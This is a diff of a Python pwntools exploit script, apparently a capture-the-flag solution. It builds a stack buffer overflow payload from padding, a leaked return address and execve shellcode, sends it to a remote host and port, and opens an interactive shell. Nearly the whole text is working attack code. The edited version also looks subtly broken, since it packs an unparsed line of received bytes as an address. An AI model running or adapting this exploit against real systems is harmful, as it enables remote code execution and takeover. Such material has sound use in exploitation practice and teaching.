@@ -12,14 +12,14 @@ shellcode = b"\x48\x31\xd2" + \
     b"\xb0\x3b" + \
     b"\x0f\x05"
 
-address = struct.pack("<Q", 0x7fffffffdf20)
-
-s = shellcode + b'a' * (72 - len(shellcode)) + address
-
-# p = pwn.process('./vuln')
-
 p = pwn.remote("107.21.135.41", 3333)
-
+p.recvuntil(b"Please select from menu: ")
+p.sendline(b"1")
+p.recvuntil(b"Current Return Address: ")
+# rip_savd = int(p.recvline().decode(), 16)
+rip_svd = p.recvline()
+print("rip_saved", rip_svd)
+address = struct.pack("<Q", rip_svd)
+s = b'a' * 40 + address + shellcode
 p.send(s)
-
 p.interactive()
